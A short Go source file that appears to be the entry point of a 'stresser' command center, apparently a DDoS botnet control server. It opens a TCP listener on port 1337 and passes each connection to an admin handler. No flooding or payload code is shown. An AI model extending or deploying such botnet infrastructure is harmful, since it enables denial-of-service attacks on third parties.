package main

import (
	"fmt"
	"net"

	"github.com/fatih/color"
)

var database *Database = NewDatabase()

func main() {
	color.HiGreen("G-STRESSER COMMAND CENTER network started...")
	tel, err := net.Listen("tcp", "0.0.0.0:1337")
	if err != nil {
		fmt.Println(err)
		return
	}
	for {
		conn, err := tel.Accept()
		if err != nil {
			break
		}
		go initialHandler(conn)
	}
	color.Red("Network stopped...")
}

func initialHandler(conn net.Conn) {
	defer conn.Close()
	NewAdmin(conn).Handle()
}
